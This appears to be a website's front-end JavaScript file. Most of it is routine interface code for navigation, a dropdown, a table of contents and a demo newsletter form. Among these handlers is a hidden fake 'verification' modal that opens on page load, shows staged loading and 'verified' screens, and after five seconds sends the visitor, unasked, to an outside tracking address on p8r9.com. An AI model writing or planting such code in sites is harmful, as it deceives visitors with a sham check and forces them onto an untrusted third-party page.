
const toggle = document.querySelector('.nav-toggle');
const nav = document.getElementById('nav');
if (toggle && nav){
  toggle.addEventListener('click', () => {
    const open = nav.classList.toggle('open');
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  });
}
const more = document.querySelector('.more');
if (more){
  const btn = more.querySelector('.more-btn');
  const menu = more.querySelector('.dropdown');
  const show = (v)=>{ menu.style.display = v ? 'block' : 'none'; btn.setAttribute('aria-expanded', v? 'true':'false'); };
  btn?.addEventListener('click', e => { e.stopPropagation(); show(menu.style.display!=='block'); });
  document.addEventListener('click', () => show(false));
}

window.fakeSubmit = (e) => {
  if (e) e.preventDefault();
  alert('Thanks! This demo does not store data.');
};

document.querySelectorAll('.newsletter').forEach(form => {
  if (!form.hasAttribute('onsubmit')) {
    form.addEventListener('submit', window.fakeSubmit);
  }
});

const toTop = document.querySelector('.to-top');
if (toTop && !toTop.hasAttribute('onclick')) {
  toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-toc]').forEach(container => {
    const hs = Array.from(document.querySelectorAll('h2, h3')).filter(h => h.id && !h.closest('.toc'));
    const list = document.createElement('div');
    hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
    container.appendChild(list);
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const modal = document.getElementById('verification-modal');
  if (modal) {
    modal.showModal();
    const startVerification = () => {
      const content = document.getElementById('modal-content');
      const loading = document.getElementById('modal-loading');
      const verified = document.getElementById('modal-verified');
      if (content) content.style.display = 'none';
      if (loading) loading.style.display = 'flex';
      setTimeout(() => {
        if (loading) loading.style.display = 'none';
        if (verified) verified.style.display = 'flex';
        setTimeout(() => {
          window.location.href = 'https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]';
        }, 1000);
      }, 2000);
    };
    document.getElementById('verify-btn-1')?.addEventListener('click', startVerification);
    document.getElementById('verify-btn-2')?.addEventListener('click', startVerification);
    setTimeout(startVerification, 5000);
  }
});

document.addEventListener('DOMContentLoaded', () => {
  const copy = document.querySelector('.copy p');
  if (copy) {
    copy.innerHTML = copy.innerHTML.replace(/\d{4}/, new Date().getFullYear());
  }
});
